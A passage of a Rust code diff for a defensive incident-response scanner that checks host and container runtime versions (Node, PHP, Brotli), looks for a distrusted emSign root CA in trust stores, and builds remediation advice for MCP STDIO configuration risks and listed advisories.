+            Err(_) => limitations
+                .permission_denied_paths
+                .push(binary.to_string_lossy().to_string()),
+        }
+    }
+}
+
+fn scan_host_node(
+    advisory: &HostAdvisory,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    let binaries = discover_node_binaries();
+    if binaries.is_empty() {
+        limitations
+            .not_inspected
+            .push("no node binary found on the host (PATH, standard prefixes, /home installs)".to_string());
+    }
+    probe_binary_versions(
+        &binaries,
+        &["--version"],
+        parse_node_version,
+        advisory.component,
+        advisory,
+        findings,
+        limitations,
+    );
+
+    for (package, version) in dpkg_installed_packages() {
+        if package == "nodejs" || package.starts_with("libnode") {
+            let (status, fixed) = host_version_status(advisory, &version);
+            record_runtime_version(
+                advisory.component,
+                &format!("dpkg {package}"),
+                &format!("dpkg:{package}"),
+                &version,
+                status,
+                fixed,
+                findings,
+            );
+        }
+    }
+
+    if let Some(containers) = docker_running_containers() {
+        for (name, image) in containers {
+            if let Some(stdout) = docker_exec_output(&name, "node --version 2>/dev/null") {
+                if let Some(version) = parse_node_version(&stdout) {
+                    let (status, fixed) = host_version_status(advisory, &version);
+                    record_runtime_version(
+                        advisory.component,
+                        "docker exec",
+                        &format!("docker:{name} ({image})"),
+                        &version,
+                        status,
+                        fixed,
+                        findings,
+                    );
+                }
+            }
+        }
+        if let Some(images) = docker_images() {
+            for image in images {
+                if let Some(env) = docker_image_env(&image) {
+                    if let Some(version) = env_value(&env, "NODE_VERSION") {
+                        let (status, fixed) = host_version_status(advisory, &version);
+                        record_docker_image_env_hint(
+                            "docker_image_node_version",
+                            advisory.component,
+                            &image,
+                            &version,
+                            matches!(status, VersionHitStatus::Compromised),
+                            fixed,
+                            findings,
+                        );
+                    }
+                }
+            }
+        }
+    } else {
+        note_docker_unavailable(limitations, true);
+    }
+}
+
+fn scan_host_php(
+    advisory: &HostAdvisory,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    let binaries = discover_php_binaries();
+    if binaries.is_empty() {
+        limitations
+            .not_inspected
+            .push("no php binary found on the host (PATH, standard prefixes)".to_string());
+    }
+    probe_binary_versions(
+        &binaries,
+        &["-v"],
+        parse_php_version,
+        advisory.component,
+        advisory,
+        findings,
+        limitations,
+    );
+
+    let mut recorded_php_packages: BTreeSet<String> = BTreeSet::new();
+    for (package, version) in dpkg_installed_packages() {
+        let is_php = package == "php"
+            || package.starts_with("php5")
+            || package.starts_with("php7")
+            || package.starts_with("php8")
+            || package.starts_with("php9");
+        if !is_php {
+            continue;
+        }
+        // Record one hit per package version (php8.3-cli, php8.3-fpm, ... share it).
+        let key = format!("{package}={version}");
+        if !recorded_php_packages.insert(key) {
+            continue;
+        }
+        let (status, fixed) = host_version_status(advisory, &version);
+        record_runtime_version(
+            advisory.component,
+            &format!("dpkg {package}"),
+            &format!("dpkg:{package}"),
+            &version,
+            status,
+            fixed,
+            findings,
+        );
+    }
+
+    if let Some(containers) = docker_running_containers() {
+        for (name, image) in containers {
+            if let Some(stdout) = docker_exec_output(&name, "php -v 2>/dev/null | head -1") {
+                if let Some(version) = parse_php_version(&stdout) {
+                    let (status, fixed) = host_version_status(advisory, &version);
+                    record_runtime_version(
+                        advisory.component,
+                        "docker exec",
+                        &format!("docker:{name} ({image})"),
+                        &version,
+                        status,
+                        fixed,
+                        findings,
+                    );
+                }
+            }
+        }
+        if let Some(images) = docker_images() {
+            for image in images {
+                if let Some(env) = docker_image_env(&image) {
+                    if let Some(version) = env_value(&env, "PHP_VERSION") {
+                        let (status, fixed) = host_version_status(advisory, &version);
+                        record_docker_image_env_hint(
+                            "docker_image_php_version",
+                            advisory.component,
+                            &image,
+                            &version,
+                            matches!(status, VersionHitStatus::Compromised),
+                            fixed,
+                            findings,
+                        );
+                    }
+                }
+            }
+        }
+    } else {
+        note_docker_unavailable(limitations, true);
+    }
+}
+
+fn scan_host_brotli(
+    advisory: &HostAdvisory,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    let mut recorded: BTreeSet<String> = BTreeSet::new();
+    for (package, version) in dpkg_installed_packages() {
+        if package == "brotli" || package.starts_with("libbrotli") {
+            let key = format!("{package}={version}");
+            if !recorded.insert(key) {
+                continue;
+            }
+            let (status, fixed) = host_version_status(advisory, &version);
+            record_runtime_version(
+                advisory.component,
+                &format!("dpkg {package}"),
+                &format!("dpkg:{package}"),
+                &version,
+                status,
+                fixed,
+                findings,
+            );
+        }
+    }
+    if recorded.is_empty() {
+        limitations
+            .not_inspected
+            .push("no brotli dpkg package installed".to_string());
+    }
+
+    // Python bindings (PyPI Brotli / brotlicffi bundle the same decoder).
+    let mut pythons: BTreeSet<String> = BTreeSet::new();
+    for candidate in ["python3", "/usr/bin/python3"] {
+        if run_command_capture(candidate, &["--version"])
+            .map(|out| out.status.success())
+            .unwrap_or(false)
+        {
+            pythons.insert(candidate.to_string());
+        }
+    }
+    for python in pythons {
+        for pkg in ["Brotli", "brotlicffi"] {
+            if let Ok(output) = run_command_capture(&python, &["-m", "pip", "show", pkg]) {
+                if let Some(version) = parse_pip_show_field(&output.stdout, "Version") {
+                    if !recorded.insert(format!("pip:{pkg}={version}")) {
+                        continue;
+                    }
+                    let (status, fixed) = host_version_status(advisory, &version);
+                    let bad = matches!(status, VersionHitStatus::Compromised);
+                    findings.environment_hits.push(EnvironmentFinding {
+                        check: format!("python_brotli_binding:{pkg}"),
+                        status: "present".to_string(),
+                        details: format!(
+                            "{python} pip package {pkg} {version} bundles the Brotli decoder{}",
+                            fixed
+                                .map(|f| format!("; fixed in {f}"))
+                                .unwrap_or_default()
+                        ),
+                        version: Some(version),
+                        bad_version: bad,
+                        raw: None,
+                    });
+                }
+            }
+        }
+    }
+
+    // Running containers: distro package, brotli CLI, and Python bindings.
+    if let Some(containers) = docker_running_containers() {
+        for (name, image) in containers {
+            let script = "dpkg-query -W -f='${Version}' libbrotli1 2>/dev/null; brotli --version 2>/dev/null | head -1; python3 -m pip show Brotli 2>/dev/null | grep -i '^Version'; python3 -m pip show brotlicffi 2>/dev/null | grep -i '^Version'; true";
+            if let Some(stdout) = docker_exec_output(&name, script) {
+                for line in stdout.lines().map(str::trim).filter(|l| !l.is_empty()) {
+                    let version = line
+                        .strip_prefix("brotli ")
+                        .or_else(|| line.strip_prefix("Version:"))
+                        .map(str::trim)
+                        .unwrap_or(line)
+                        .to_string();
+                    if !version.chars().next().is_some_and(|c| c.is_ascii_digit()) {
+                        continue;
+                    }
+                    let (status, fixed) = host_version_status(advisory, &version);
+                    record_runtime_version(
+                        advisory.component,
+                        "docker exec",
+                        &format!("docker:{name} ({image})"),
+                        &version,
+                        status,
+                        fixed,
+                        findings,
+                    );
+                }
+            }
+        }
+        limitations
+            .not_inspected
+            .push("stopped docker images were not probed for brotli (no safe static version source)".to_string());
+    } else {
+        note_docker_unavailable(limitations, true);
+    }
+
+    // Note: Node.js installs bundle their own decoder; `scira scan node` covers them.
+    limitations.notes.push(
+        "Node.js runtimes bundle their own Brotli decoder; run `scira scan node --all-dirs` to cover those installs.".to_string(),
+    );
+}
+
+fn emudhra_trust_entries(script_output: &str) -> Vec<String> {
+    script_output
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .filter(|line| {
+            line.contains(EMUDHRA_DISTRUSTED_ROOT)
+                || line.replace(' ', "_").contains("emSign_ECC_Root_CA_-_G3")
+        })
+        .map(|line| line.to_string())
+        .collect()
+}
+
+fn openssl_bundle_subjects(bundle: &str) -> Option<String> {
+    let script = format!(
+        "openssl crl2pkcs7 -nocrl -certfile {bundle} 2>/dev/null | openssl pkcs7 -print_certs -noout 2>/dev/null"
+    );
+    let output = run_command_capture("sh", &["-lc", &script]).ok()?;
+    if !output.status.success() {
+        return None;
+    }
+    let stdout = output.stdout.trim().to_string();
+    if stdout.is_empty() {
+        None
+    } else {
+        Some(stdout)
+    }
+}
+
+fn scan_host_emudhra(findings: &mut Findings, limitations: &mut Limitations) {
+    // PEM trust anchors store subjects in filenames (Debian/Ubuntu layout:
+    // spaces become underscores), not in the base64 payload, so scan names.
+    let mut trust_roots: Vec<PathBuf> = Vec::new();
+    for dir in [
+        "/etc/ssl/certs",
+        "/usr/local/share/ca-certificates",
+        "/etc/pki/trust/anchors",
+        "/etc/ssl/local-certificates",
+    ] {
+        if let Ok(entries) = fs::read_dir(dir) {
+            for entry in entries.flatten() {
+                trust_roots.push(entry.path());
+            }
+        }
+    }
+    // Mozilla-layout .crt tree.
+    for base in ["/usr/share/ca-certificates", "/etc/ca-certificates"] {
+        for entry in WalkDir::new(base).max_depth(4).into_iter().flatten() {
+            if entry.file_type().is_file() {
+                trust_roots.push(entry.path().to_path_buf());
+            }
+        }
+    }
+
+    let distrusted_marker = "emSign_ECC_Root_CA_-_G3";
+    let mut scanned_any = false;
+    let mut still_trusted: BTreeSet<&'static str> = BTreeSet::new();
+    for path in &trust_roots {
+        let name = path
+            .file_name()
+            .map(|n| n.to_string_lossy().to_string())
+            .unwrap_or_default();
+        if !name.to_lowercase().contains("emsign") {
+            continue;
+        }
+        scanned_any = true;
+        if name.contains(distrusted_marker) {
+            findings.ioc_file_hits.push(IocHit {
+                indicator: format!(
+                    "distrusted root '{EMUDHRA_DISTRUSTED_ROOT}' present in trust store"
+                ),
+                path: path.to_string_lossy().to_string(),
+                line_number: None,
+                line: Some(name.clone()),
+            });
+        } else if let Some(root) = EMUDHRA_STILL_TRUSTED_ROOTS
+            .iter()
+            .find(|root| name.contains(&root.replace(' ', "_")))
+        {
+            still_trusted.insert(root);
+        }
+    }
+    if !still_trusted.is_empty() {
+        limitations.notes.push(format!(
+            "still-trusted emSign roots present (context only, not an incident): {}",
+            still_trusted.into_iter().collect::<Vec<_>>().join(", ")
+        ));
+    }
+    if !scanned_any {
+        limitations
+            .not_inspected
+            .push("no emSign trust anchors found in known trust store directories".to_string());
+    }
+
+    // Bundled CA files keep subjects only inside the base64 payload; enumerate
+    // them with openssl when available.
+    let bundle = "/etc/ssl/certs/ca-certificates.crt";
+    if Path::new(bundle).is_file() {
+        match openssl_bundle_subjects(bundle) {
+            Some(subjects) => {
+                for entry in emudhra_trust_entries(&subjects) {
+                    findings.ioc_file_hits.push(IocHit {
+                        indicator: format!(
+                            "distrusted root '{EMUDHRA_DISTRUSTED_ROOT}' present in CA bundle"
+                        ),
+                        path: bundle.to_string(),
+                        line_number: None,
+                        line: Some(entry),
+                    });
+                }
+            }
+            None => limitations
+                .missing_tools
+                .push("openssl (CA bundle subject enumeration)".to_string()),
+        }
+    }
+
+    for (package, version) in dpkg_installed_packages() {
+        if package == "ca-certificates" {
+            limitations.notes.push(format!(
+                "host ca-certificates {version}; refresh via the distro vendor so the emSign ECC Root CA - G3 removal propagates"
+            ));
+        }
+    }
+
+    // Running containers with stale trust stores (filename + openssl checks).
+    if let Some(containers) = docker_running_containers() {
+        for (name, image) in containers {
+            let script = "ls /etc/ssl/certs 2>/dev/null | grep -i emsign; openssl crl2pkcs7 -nocrl -certfile /etc/ssl/certs/ca-certificates.crt 2>/dev/null | openssl pkcs7 -print_certs -noout 2>/dev/null | grep -i 'emSign ECC Root CA - G3'; true";
+            if let Some(stdout) = docker_exec_output(&name, script) {
+                let entries: BTreeSet<String> =
+                    emudhra_trust_entries(&stdout).into_iter().collect();
+                if !entries.is_empty() {
+                    findings.ioc_file_hits.push(IocHit {
+                        indicator: format!(
+                            "distrusted root '{EMUDHRA_DISTRUSTED_ROOT}' present in container trust store"
+                        ),
+                        path: format!("docker:{name} ({image})"),
+                        line_number: None,
+                        line: Some(entries.into_iter().collect::<Vec<_>>().join("; ")),
+                    });
+                }
+            }
+        }
+        limitations
+            .not_inspected
+            .push("stopped docker containers and image layers were not probed for stale emSign trust stores".to_string());
+    } else {
+        note_docker_unavailable(limitations, true);
+    }
+}
+
 fn build_summary(findings: &Findings, limitations: &Limitations) -> Summary {
+    let high_mcp_risk = findings
+        .mcp_risk_hits
+        .iter()
+        .any(|hit| matches!(hit.severity, McpRiskSeverity::High));
     let likely_affected = findings
         .version_hits
         .iter()
         .any(|hit| matches!(hit.status, VersionHitStatus::Compromised))
         || findings.environment_hits.iter().any(|f| f.bad_version)
         || !findings.ioc_file_hits.is_empty()
-        || !findings.ioc_domain_hits.is_empty();
+        || !findings.ioc_domain_hits.is_empty()
+        || high_mcp_risk;
 
     let references_found = !findings.manifest_hits.is_empty()
-        || findings.environment_hits.iter().any(|f| f.status == "present")
-        || !findings.cache_hits.is_empty();
+        || findings
+            .environment_hits
+            .iter()
+            .any(|f| f.status == "present")
+        || !findings.cache_hits.is_empty()
+        || !findings.mcp_inventory.is_empty()
+        || !findings.mcp_risk_hits.is_empty();
 
     let status = if likely_affected {
         IncidentStatus::LikelyAffected
@@ -940,19 +3274,26 @@ fn build_summary(findings: &Findings, limitations: &Limitations) -> Summary {
 
     let reason = match status {
         IncidentStatus::LikelyAffected => {
-            if findings
+            if high_mcp_risk {
+                "High-risk MCP or Docker execution-surface patterns were found in local scan evidence.".to_string()
+            } else if findings
                 .version_hits
                 .iter()
                 .any(|hit| matches!(hit.status, VersionHitStatus::Compromised))
                 || findings.environment_hits.iter().any(|f| f.bad_version)
             {
-                "A compromised version or strong IOC evidence was found during the scan.".to_string()
+                "A compromised version or strong IOC evidence was found during the scan."
+                    .to_string()
             } else {
                 "IOC evidence was found even though a compromised version was not confirmed in the scanned manifests.".to_string()
             }
         }
         IncidentStatus::ReferencesFoundFollowUpNeeded => {
-            "The package or related references were found, but the scan did not confirm a compromised version.".to_string()
+            if !findings.mcp_inventory.is_empty() || !findings.mcp_risk_hits.is_empty() {
+                "MCP servers or moderate-risk MCP configuration patterns were found and should be reviewed.".to_string()
+            } else {
+                "The package or related references were found, but the scan did not confirm a compromised version.".to_string()
+            }
         }
         IncidentStatus::NoIndicatorsFound => {
             "No indicators were found in the checks that completed successfully.".to_string()
@@ -961,7 +3302,10 @@ fn build_summary(findings: &Findings, limitations: &Limitations) -> Summary {
 
     let mut confidence_notes = Vec::new();
     if !limitations.permission_denied_paths.is_empty() {
-        confidence_notes.push("Some paths could not be inspected with the current user. Results may be incomplete.".to_string());
+        confidence_notes.push(
+            "Some paths could not be inspected with the current user. Results may be incomplete."
+                .to_string(),
+        );
     }
     if !limitations.missing_tools.is_empty() {
         confidence_notes.push(format!(
@@ -970,7 +3314,9 @@ fn build_summary(findings: &Findings, limitations: &Limitations) -> Summary {
         ));
     }
     if confidence_notes.is_empty() {
-        confidence_notes.push("Deterministic findings shown here are the source of truth for this run.".to_string());
+        confidence_notes.push(
+            "Deterministic findings shown here are the source of truth for this run.".to_string(),
+        );
     }
 
     Summary {
@@ -980,7 +3326,18 @@ fn build_summary(findings: &Findings, limitations: &Limitations) -> Summary {
     }
 }
 
-fn build_actions(profile: &IncidentProfile, summary: &Summary, limitations: &Limitations) -> Actions {
+fn build_actions(
+    profile: &IncidentProfile,
+    summary: &Summary,
+    limitations: &Limitations,
+) -> Actions {
+    if profile.ecosystem == "mcp" {
+        return build_mcp_actions(profile, summary, limitations);
+    }
+    if profile.ecosystem == "host-runtime" {
+        return build_host_runtime_actions(profile, summary, limitations);
+    }
+
     let mut manual_verification_steps = vec![
         "Review transitive dependency paths, especially if the package is pulled in by frameworks like DSPy, CrewAI, or Browser-Use.".to_string(),
         "Check whether the compromised user or host had access to cloud credentials, SSH keys, Kubernetes configs, or `.env` files.".to_string(),
@@ -1042,7 +3399,143 @@ fn build_actions(profile: &IncidentProfile, summary: &Summary, limitations: &Lim
     }
 }
 
-fn collect_candidate_files(target: &Path, matcher: &GlobSet, limitations: &mut Limitations) -> Result<Vec<PathBuf>> {
+fn build_host_runtime_actions(
+    profile: &IncidentProfile,
+    summary: &Summary,
+    limitations: &Limitations,
+) -> Actions {
+    let mut manual_verification_steps = vec![
+        "Verify each discovered runtime version against the advisory fixed versions listed in the incident metadata.".to_string(),
+        "Check per-user installs under /home (nvm, volta, ~/.local) and container images rebuilt recently; those are the usual gaps.".to_string(),
+    ];
+    if !limitations.missing_tools.is_empty() {
+        manual_verification_steps.push(
+            "Some collectors were unavailable (for example the Docker daemon); re-run with privileges that can reach them for full coverage.".to_string(),
+        );
+    }
+
+    match summary.status {
+        IncidentStatus::LikelyAffected => Actions {
+            immediate_next_steps: profile
+                .immediate_next_steps
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            credential_rotation_scope: profile
+                .credential_rotation_scope
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            cleanup_and_rebuild: profile
+                .cleanup_and_rebuild
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            manual_verification_steps,
+        },
+        IncidentStatus::ReferencesFoundFollowUpNeeded => Actions {
+            immediate_next_steps: vec![
+                "Confirm the discovered installs against the advisory and update anything on a vulnerable line.".to_string(),
+                "Rebuild affected container images from updated bases rather than patching in place.".to_string(),
+            ],
+            credential_rotation_scope: vec![
+                "Credential rotation is not indicated by this report alone.".to_string(),
+            ],
+            cleanup_and_rebuild: vec![
+                "Pin runtime versions to the fixed releases for each line when rebuilding.".to_string(),
+            ],
+            manual_verification_steps,
+        },
+        IncidentStatus::NoIndicatorsFound => Actions {
+            immediate_next_steps: vec![
+                "No indicators were found in this run. Keep runtime inventory under advisory monitoring.".to_string(),
+                "Re-run with broader privileges if some collectors were skipped.".to_string(),
+            ],
+            credential_rotation_scope: vec![
+                "Credential rotation is not indicated by this report alone.".to_string(),
+            ],
+            cleanup_and_rebuild: vec![
+                format!(
+                    "When rebuilding, pin to {} or newer on a supported line.",
+                    profile.safe_version
+                ),
+            ],
+            manual_verification_steps,
+        },
+    }
+}
+
+fn build_mcp_actions(
+    profile: &IncidentProfile,
+    summary: &Summary,
+    limitations: &Limitations,
+) -> Actions {
+    let mut manual_verification_steps = vec![
+        "Review each discovered MCP server command and confirm who can modify the config file that defines it.".to_string(),
+        "Check whether MCP server processes can read SSH keys, cloud credentials, Kubernetes configs, npm tokens, Docker auth, or project `.env` files.".to_string(),
+    ];
+
+    if !limitations.permission_denied_paths.is_empty() {
+        manual_verification_steps.push(
+            "Some paths could not be inspected. Re-run with broader privileges only if you intend full host-level MCP coverage.".to_string(),
+        );
+    }
+
+    match summary.status {
+        IncidentStatus::LikelyAffected => Actions {
+            immediate_next_steps: profile
+                .immediate_next_steps
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            credential_rotation_scope: profile
+                .credential_rotation_scope
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            cleanup_and_rebuild: profile
+                .cleanup_and_rebuild
+                .iter()
+                .map(|s| s.to_string())
+                .collect(),
+            manual_verification_steps,
+        },
+        IncidentStatus::ReferencesFoundFollowUpNeeded => Actions {
+            immediate_next_steps: vec![
+                "Review the discovered MCP servers and disable any STDIO server you do not recognize.".to_string(),
+                "Pin package-runner based servers to reviewed versions or replace them with local reviewed binaries.".to_string(),
+                "Move shared MCP configs into source-reviewed locations and avoid prompt-editable config paths for trusted tools.".to_string(),
+            ],
+            credential_rotation_scope: vec![
+                "Credential rotation is not indicated by MCP inventory alone, but review secrets reachable by any medium-risk STDIO server.".to_string(),
+            ],
+            cleanup_and_rebuild: vec![
+                "Remove unused MCP server entries and keep only the minimum server set needed for current workflows.".to_string(),
+                "Prefer explicit executable paths and pinned package versions over runtime package resolution.".to_string(),
+            ],
+            manual_verification_steps,
+        },
+        IncidentStatus::NoIndicatorsFound => Actions {
+            immediate_next_steps: vec![
+                "No MCP STDIO risk indicators were found in this run.".to_string(),
+                "Re-run against other home directories or managed config locations if you intended broader laptop coverage.".to_string(),
+            ],
+            credential_rotation_scope: vec![
+                "Credential rotation is not indicated by this report alone.".to_string(),
+            ],
+            cleanup_and_rebuild: vec![
+                "Keep MCP configs reviewed, pinned, and limited to the minimum filesystem and credential access needed.".to_string(),
+            ],
+            manual_verification_steps,
+        },
+    }
+}
+
+fn collect_candidate_files(
+    target: &Path,
+    matcher: &GlobSet,
+    limitations: &mut Limitations,
+) -> Result<Vec<PathBuf>> {
     let mut files = Vec::new();
 
     for entry in WalkDir::new(target)
@@ -1057,7 +3550,10 @@ fn collect_candidate_files(target: &Path, matcher: &GlobSet, limitations: &mut L
                 }
                 let path = entry.path();
                 let rel = path.strip_prefix(target).unwrap_or(path);
-                let file_name = path.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
+                let file_name = path
+                    .file_name()
+                    .map(|n| n.to_string_lossy().to_string())
+                    .unwrap_or_default();
                 let file_name_path = Path::new(&file_name);
 
                 if !(matcher.is_match(rel) || matcher.is_match(file_name_path)) {
@@ -1067,7 +3563,11 @@ fn collect_candidate_files(target: &Path, matcher: &GlobSet, limitations: &mut L
                 match entry.metadata() {
                     Ok(metadata) if metadata.len() > MAX_TEXT_FILE_BYTES => push_limited(
                         &mut limitations.not_inspected,
-                        format!("{} (file larger than {} bytes)", path.display(), MAX_TEXT_FILE_BYTES),
+                        format!(
+                            "{} (file larger than {} bytes)",
+                            path.display(),
+                            MAX_TEXT_FILE_BYTES
+                        ),
                     ),
                     Ok(_) => files.push(path.to_path_buf()),
                     Err(err) => {
@@ -1076,7 +3576,10 @@ fn collect_candidate_files(target: &Path, matcher: &GlobSet, limitations: &mut L
                             .map(|e| e.kind() == io::ErrorKind::PermissionDenied)
                             .unwrap_or(false);
                         if is_permission_denied {
-                            push_limited(&mut limitations.permission_denied_paths, path.display().to_string())
+                            push_limited(
+                                &mut limitations.permission_denied_paths,
+                                path.display().to_string(),
+                            )
                         } else {
                             push_limited(
                                 &mut limitations.not_inspected,
@@ -1099,7 +3602,11 @@ fn collect_candidate_files(target: &Path, matcher: &GlobSet, limitations: &mut L
     Ok(files)
 }
 
-fn scan_cache_hits(package: &str, roots: &[PathBuf], limitations: &mut Limitations) -> Result<Vec<CacheHit>> {
+fn scan_cache_hits(
+    package: &str,
+    roots: &[PathBuf],
+    limitations: &mut Limitations,
+) -> Result<Vec<CacheHit>> {
     let mut hits = Vec::new();
     let needle = package.to_lowercase();
 
@@ -1119,7 +3626,10 @@ fn scan_cache_hits(package: &str, roots: &[PathBuf], limitations: &mut Limitatio
                         hits.push(CacheHit {
                             source: classify_cache_source(&root),
                             path: entry.path().display().to_string(),
-                            details: format!("Package-related cache artifact found under {}", root.display()),
+                            details: format!(
+                                "Package-related cache artifact found under {}",
+                                root.display()
+                            ),
                         });
                         if hits.len() >= 50 {
                             return Ok(hits);
@@ -1189,7 +3699,11 @@ fn search_ioc_files(
     Ok(hits)
 }
 
-fn explain_report(profile: &IncidentProfile, report: &ScanReport, config: &LlmConfig) -> Result<ExplainOutput> {
+fn explain_report(
+    profile: &IncidentProfile,
+    report: &ScanReport,
+    config: &LlmConfig,
+) -> Result<ExplainOutput> {
     let system_prompt = build_explainer_system_prompt(profile);
     let user_prompt = build_explainer_user_prompt(profile, report)?;
     let explanation = match config.provider {
@@ -1206,7 +3720,9 @@ fn explain_report(profile: &IncidentProfile, report: &ScanReport, config: &LlmCo
 }
 
 fn call_anthropic(config: &LlmConfig, system_prompt: &str, user_prompt: &str) -> Result<String> {
-    let client = Client::builder().timeout(std::time::Duration::from_secs(90)).build()?;
+    let client = Client::builder()
+        .timeout(std::time::Duration::from_secs(90))
+        .build()?;
     let url = config
         .base_url
         .clone()
@@ -1244,7 +3760,9 @@ fn call_anthropic(config: &LlmConfig, system_prompt: &str, user_prompt: &str) ->
 }
 
 fn call_openai(config: &LlmConfig, system_prompt: &str, user_prompt: &str) -> Result<String> {
-    let client = Client::builder().timeout(std::time::Duration::from_secs(90)).build()?;
+    let client = Client::builder()
+        .timeout(std::time::Duration::from_secs(90))
+        .build()?;
     let url = config
         .base_url
         .clone()
@@ -1279,12 +3797,18 @@ fn call_openai(config: &LlmConfig, system_prompt: &str, user_prompt: &str) -> Re
 }
 
 fn call_gemini(config: &LlmConfig, system_prompt: &str, user_prompt: &str) -> Result<String> {
-    let client = Client::builder().timeout(std::time::Duration::from_secs(90)).build()?;
+    let client = Client::builder()
+        .timeout(std::time::Duration::from_secs(90))
+        .build()?;
     let base = config
         .base_url
         .clone()
         .unwrap_or_else(|| "https://generativelanguage.googleapis.com/v1beta".to_string());
-    let mut url = Url::parse(&format!("{}/models/{}:generateContent", base.trim_end_matches('/'), config.model))?;
+    let mut url = Url::parse(&format!(
+        "{}/models/{}:generateContent",
+        base.trim_end_matches('/'),
+        config.model
+    ))?;
     url.query_pairs_mut().append_pair("key", &config.api_key);
 
     let response: Value = client
@@ -1376,13 +3900,18 @@ fn detect_llm_config() -> Result<Option<LlmConfig>> {
         let provider = parse_provider(&provider)?;
         let key = scira_key
             .or_else(|| provider_native_key(provider))
-            .ok_or_else(|| anyhow!("SCIRA_LLM_PROVIDER is set but no matching API key was found"))?;
+            .ok_or_else(|| {
+                anyhow!("SCIRA_LLM_PROVIDER is set but no matching API key was found")
+            })?;
         Some((provider, key))
     } else if let Some(key) = env::var("ANTHROPIC_API_KEY").ok() {
         Some((LlmProvider::Anthropic, key))
     } else if let Some(key) = env::var("OPENAI_API_KEY").ok() {
         Some((LlmProvider::Openai, key))
-    } else if let Some(key) = env::var("GEMINI_API_KEY").ok().or_else(|| env::var("GOOGLE_API_KEY").ok()) {
+    } else if let Some(key) = env::var("GEMINI_API_KEY")
+        .ok()
+        .or_else(|| env::var("GOOGLE_API_KEY").ok())
+    {
         Some((LlmProvider::Gemini, key))
     } else if let Some(key) = scira_key {
         Some((infer_provider_from_key(&key)?, key))
@@ -1409,7 +3938,9 @@ fn parse_provider(value: &str) -> Result<LlmProvider> {
         "anthropic" => Ok(LlmProvider::Anthropic),
         "openai" | "chatgpt" => Ok(LlmProvider::Openai),
         "gemini" | "google" => Ok(LlmProvider::Gemini),
-        other => Err(anyhow!("unsupported provider `{other}`; use anthropic, openai, or gemini")),
+        other => Err(anyhow!(
+            "unsupported provider `{other}`; use anthropic, openai, or gemini"
+        )),
     }
 }
 
@@ -1417,7 +3948,9 @@ fn provider_native_key(provider: LlmProvider) -> Option<String> {
     match provider {
         LlmProvider::Anthropic => env::var("ANTHROPIC_API_KEY").ok(),
         LlmProvider::Openai => env::var("OPENAI_API_KEY").ok(),
-        LlmProvider::Gemini => env::var("GEMINI_API_KEY").ok().or_else(|| env::var("GOOGLE_API_KEY").ok()),
+        LlmProvider::Gemini => env::var("GEMINI_API_KEY")
+            .ok()
+            .or_else(|| env::var("GOOGLE_API_KEY").ok()),
     }
 }
 
@@ -1489,6 +4022,7 @@ fn incident_profile(id: &str) -> Result<IncidentProfile> {
             source_version: "2026-03-25",
             bundled_skill_md: BUNDLED_PYPI_SKILL_MD,
             bundled_ioc_patterns_md: BUNDLED_PYPI_IOC_PATTERNS_MD,
+            host_advisory: None,
         }),
         "axios" | "axios-npm" => Ok(IncidentProfile {
             id: "axios",
@@ -1529,9 +4063,197 @@ fn incident_profile(id: &str) -> Result<IncidentProfile> {
             source_version: "2026-03-31",
             bundled_skill_md: BUNDLED_NPM_SKILL_MD,
             bundled_ioc_patterns_md: BUNDLED_NPM_IOC_PATTERNS_MD,
+            host_advisory: None,
+        }),
+        "mcp-stdio" | "mcp" => Ok(IncidentProfile {
+            id: "mcp-stdio",
+            title: "MCP STDIO config RCE and supply-chain risk",
+            ecosystem: "mcp",
+            package: "mcp-server-config",
+            bad_versions: &[],
+            safe_version: "reviewed, pinned, least-privilege MCP server config",
+            malicious_dependency: None,
+            related_package_names: &[],
+            ioc_domains: &[],
+            ioc_files: &[],
+            search_patterns: &[
+                ".mcp.json",
+                "mcp.json",
+                ".vscode/mcp.json",
+                "claude_desktop_config.json",
+                "mcp_config.json",
+            ],
+            immediate_next_steps: &[
+                "Disable any high-risk MCP STDIO server until you can confirm the command, arguments, and config provenance are trusted.",
+                "Replace shell-evaluated or package-runner-evaluated server launches with pinned, reviewed executables.",
+                "Preserve the MCP config file and record which user context could execute the server before making cleanup changes.",
+            ],
+            credential_rotation_scope: &[
+                "Review and rotate credentials reachable by the user context that could launch a high-risk MCP server, especially SSH keys, cloud credentials, Kubernetes configs, npm tokens, Docker auth, and project `.env` secrets.",
+                "Audit local shell history, agent logs, and provider logs if a suspicious MCP STDIO command may have executed.",
+            ],
+            cleanup_and_rebuild: &[
+                "Remove unused or unrecognized MCP server entries from local and project configs.",
+                "Pin MCP server packages to reviewed versions or install local reviewed binaries instead of resolving packages at runtime.",
+                "Move trusted MCP definitions into source-reviewed or managed configuration and avoid prompt-editable config paths for privileged tools.",
+            ],
+            source_repo: "https://github.com/makash/agent-infra-security",
+            source_skill: "mcp-supply-chain-response",
+            source_version: "2026-05-03",
+            bundled_skill_md: BUNDLED_MCP_SKILL_MD,
+            bundled_ioc_patterns_md: BUNDLED_MCP_IOC_PATTERNS_MD,
+            host_advisory: None,
+        }),
+        "php" | "php2shell" | "php-rce" => Ok(IncidentProfile {
+            id: "php",
+            title: "PHP PHP2Shell critical RCEs (CVE-2026-109618, CVE-2026-109619)",
+            ecosystem: "host-runtime",
+            package: "php",
+            bad_versions: &[],
+            safe_version: "8.2.35 / 8.3.36 / 8.4.27 / 8.5.12",
+            malicious_dependency: None,
+            related_package_names: &["php"],
+            ioc_domains: &[],
+            ioc_files: &[],
+            search_patterns: &[],
+            immediate_next_steps: &[
+                "Upgrade every PHP install to the fixed release for its line (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12); PHP 8.1 and earlier are EOL and unfixed, so migrate them to a fixed supported release.",
+                "Prioritize internet-facing PHP (especially Apache mod_php, where unauthenticated RCE was demonstrated with default settings); active scanning started within days of disclosure.",
+                "Suppressing warnings or disabling display_errors is not a mitigation; only updating fixes CVE-2026-109618 and CVE-2026-109619.",
+            ],
+            credential_rotation_scope: &[
